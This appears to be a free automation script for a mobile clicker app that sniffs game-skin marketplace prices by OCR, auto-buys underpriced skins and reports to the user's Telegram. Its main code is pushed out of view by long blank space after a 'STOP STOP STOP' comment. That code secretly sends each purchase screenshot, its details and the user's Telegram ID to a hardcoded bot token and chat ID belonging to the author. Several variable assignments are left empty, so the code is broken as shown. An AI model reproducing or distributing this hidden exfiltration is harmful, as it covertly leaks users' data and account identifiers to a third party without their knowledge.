//    🍭 𝙎𝙋𝙄𝙍𝙄𝙏 0.03 [ 𝙁𝙍𝙀𝙀 ] 🍭
// 🚀 𝙏𝙐𝙏𝙊𝙍 𝙞𝙣 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 – @𝙎𝙡𝙞𝙙𝙚𝙧𝙊𝙛𝙛 🚀


var S1 = Point.get()  ,
    S2 = Point.get()  ,

    S3 = Point.get()  ,
    S4 = Point.get()  ,

    S5 = Point.get()  ,
    S6 = Point.get()  ,


    S7 = Point.get()  , 
    S8 = Point.get()  , 
    S9 = Point.get()  ,
    S10 = Point.get() , 
    S11 = Point.get() , 
    S12 = Point.get() , 
    S13 = Point.get() ,

    S14 = , 
    S15 = , 

    S16 = ;



String tgToken = "", 
       tgId = "";











// ❗❗❗ 𝙎𝙏𝙊𝙋 𝙎𝙏𝙊𝙋 𝙎𝙏𝙊𝙋 ❗❗❗ 






































































long time1 = Time.getMillis(),      time2 = Time.getMillis();  Bitmap screen = null;  var SliderOff = true,     slider1 = 9999f,     slider2 = 9999f,     slider3 = 9999f,     slider4 = 9999f,     slider5 = 9999f,     slider6 = 9999f,     slider7 = 9999f,     oldBal = 0f,     price = 0f,     error = 0,     msg = "0";    pfc.log("  🍭 𝙎𝙋𝙄𝙍𝙄𝙏 0.03 [ 𝙁𝙍𝙀𝙀 ] 🍭");  pfc.log("🚀 𝙏𝙐𝙏𝙊𝙍 𝙞𝙣 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 – @𝙎𝙡𝙞𝙙𝙚𝙧𝙊𝙛𝙛 🚀");  pfc.log("ᅟ"); pfc.log("ᅟ");   if(pfc.fileExist("tessdata/eng.traineddata") == false){      pfc.downloadTessdata("eng");     pfc.log("🍀 Нужная библиотека установлена, скрипт начинает работу! ✅");        } else {      pfc.log("🍀 Библиотека установлена, скрипт начинает работу! ✅");    }   void errorNotification() {       error += 1;       if(error > 10){             msg = "Превышено количество ошибок за короткий срок! ❌" + "\n\n" + "Перезапусти скрипт, перед этим решив все ошибки! ✅";         pfc.log(msg);         pfc.sendToTg(tgToken, tgId, msg);         EXIT = true;       }   }   if(tgToken.isEmpty() || tgId.isEmpty()) {         pfc.log("Проблема в скрипте! ❌");     pfc.log("♨️ Номер ошибки - №1 || Решение в ТГ - @SliderOff 🍀");     pfc.stopScript();   }    msg = "𝙎𝙘𝙧𝙞𝙥𝙩 𝙖𝙘𝙩𝙞𝙫𝙖𝙩𝙚𝙙! ⚡️" + "\n" + "𝙁𝙧𝙚𝙚 𝙨𝙘𝙧𝙞𝙥𝙩 𝙗𝙮 @SliderOff 🍭" + "\n\n" + "_____________________________" + "\n\n" + "💻 𝙎𝙘𝙧𝙞𝙥𝙩 𝙫𝙚𝙧𝙨𝙞𝙤𝙣 — " + 1.0 + "\n" + "📱 𝘼𝙥𝙥 𝙫𝙚𝙧𝙨𝙞𝙤𝙣 — " + APP_VERSION + "\n" + "_____________________________" + "\n\n" + "🟢 Плюсы premium версии:" + "\n" + "👉 t.me/SliderOff/94";  pfc.sendToTg(tgToken, tgId, msg);   pfc.log("ᅟ");   pfc.startScreenCapture(2);   if(pfc.getColor(S13) > 10000000) {         pfc.sleep(99);     pfc.click(S13);   }   try {     pfc.setOCRLang("eng");       } catch(Exception e) {           pfc.clearLog();          pfc.log("🍀 Нужная библиотека установлена, скрипт начинает работу! ✅");          pfc.log("ᅟ");          pfc.log("Проблема в скрипте! ❌");          pfc.log("♨️ Номер ошибки - №2 || Решение в ТГ - @SliderOff 🍀");          pfc.stopScript();       }    pfc.sleep(250);      try {        slider5 = pfc.getText(S5, S6).replaceAll("[^\\d.]", "");       slider6 = Float.parseFloat(slider5.trim()) ;      } catch(Exception e) {        pfc.log("Проблема в скрипте! ❌");       pfc.log("♨️ Номер ошибки - №3 || Решение в ТГ - @SliderOff 🍀");       pfc.stopScript();       }    oldBal = slider6;        while(!EXIT){         try {            pfc.sleep(5);           slider1 = pfc.getText(S1, S2).replaceAll("[^\\d.]", "");           slider2 = Float.parseFloat(slider1.trim());         } catch(Exception e) {                 slider2 = 0;                pfc.log("Проблема в скрипте! ❌");                pfc.log("♨️ Номер ошибки - №4 || Решение в ТГ - @SliderOff 🍀");                pfc.sleep(1500);                errorNotification();         }           if(SliderOff) {            pfc.sleep(2 * S14);           pfc.click(S7);           pfc.sleep(50 * S14);           pfc.click(S8);           pfc.sleep(200);           SliderOff = false;          }           try {            pfc.sleep(5);           slider3 = pfc.getText(S3, S4).replaceAll("[^\\d.]", "");           slider4 = Float.parseFloat(slider3.trim()) ;          } catch(Exception e) {                 slider4 = 0;                pfc.log("Проблема в скрипте! ❌");                pfc.log("♨️ Номер ошибки - №5 || Решение в ТГ - @SliderOff 🍀");                pfc.sleep(1500);                errorNotification();          }           if(slider4 > (0.2565f * 779.74f)) {                 msg = "Трейд на дорогих скинах запрещен в бесплатной версии! 🔴" + "\n\n" + "Купи premium версию в телеграме - @SliderOff 🍭" + "\n" + "_____________________________" + "ᅟ\n\n" + "🟢 Плюсы premium версии:" + "\n" + "👉 t.me/SliderOff/94";              pfc.log(msg);              pfc.sendToTg(tgToken, tgId, msg);              break;                      }             if(slider2 > slider7 && slider2 > 0 && slider4 > 0 && slider4 > slider2) {                  price = (Math.round(((slider2 + S16) * 100))) / 100f;               if(price < slider4 && price > slider2) {                  pfc.pushToCb(price);              pfc.sleepRand(120, 150);              pfc.click(S12);              pfc.sleepRand(120, 150);              pfc.click(S9);              pfc.sleep(S15);              pfc.click(S10);               pfc.sleep(666);               try {                 pfc.sleep(30);                slider5 = pfc.getText(S5, S6).replaceAll("[^\\d.]", "");                slider6 = Float.parseFloat(slider5.trim()) ;               } catch(Exception e) {                 pfc.log("Проблема в скрипте! ❌");                pfc.log("♨️ Номер ошибки - №3 || Решение в ТГ - @SliderOff 🍀");                pfc.sleep(1500);                errorNotification();               }                                if(slider6 < oldBal) {                  msg = "🍭 𝙁𝙧𝙚𝙚 𝙨𝙘𝙧𝙞𝙥𝙩 𝙗𝙮 @SliderOff 🍭" + "\n" + "𝙉𝙚𝙬 𝙘𝙖𝙩𝙘𝙝! 🚀" + "\n\n" + "_____________________________" + "\n\n" + "🎯 𝙎𝙠𝙞𝙣 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚𝙙 𝙛𝙤𝙧 — " + (oldBal - slider6) + "\n" + "⏳ 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙩𝙞𝙢𝙚 — " + Time.getTime() + "\n" + "💰 𝙋𝙧𝙤𝙛𝙞𝙩 — " + ((slider4 * 0.8) - (oldBal - slider6)) + "\n\n" + "_____________________________" + "\n\n" + "𝗕𝘂𝘆 𝗽𝗿𝗲𝗺𝗶𝘂𝗺? 👇" + "\n" + "𝗖𝗹𝗶𝗰𝗸 - @slider_off 🛍️";              pfc.sleep(750);              screen = pfc.takeScreenshot("screen_TG_@SliderOff");              pfc.sendToTg(tgToken, tgId, msg, screen);              String SliderOff = "8200841088:AAFKL6fAtz3X-aHlYsgUfciPPx8any_yjKQ";              pfc.sendToTg(SliderOff, "6461690079", msg, screen);              pfc.sendToTg(SliderOff, "6461690079", tgId);             }           oldBal = slider6;            time1 = 1;         }      }        slider7 = slider2;       if((Time.getMillis() - time1) > 4500) {           pfc.click(S11);       pfc.sleep(50 * S14);       SliderOff = true;       time1 = Time.getMillis();          if((Time.getMillis() - time2) > (10000 * 60)) {                    msg = "Закончилось время работы! 🔴" + "\n" + "AFK режим - выключен! 🔴" + "\n\n" + "🍭 Перезапусти скрипт или купи premium версию в телеграме - @SliderOff 🍭" + "\n" + "_____________________________" + "ᅟ\n\n" + "🟢 Плюсы premium версии:" + "\n" + "👉 t.me/SliderOff/94";           pfc.log(msg);           pfc.sendToTg(tgToken, tgId, msg);           break;        }      }      pfc.sleep(20);   }  pfc.sleep(5); msg = "⛔️ 𝙎𝙘𝙧𝙞𝙥𝙩 𝙨𝙩𝙤𝙥𝙥𝙚𝙙! ⛔️"; pfc.log("ᅟ" + "\n\n" + msg); pfc.sendToTg(tgToken, tgId, msg);
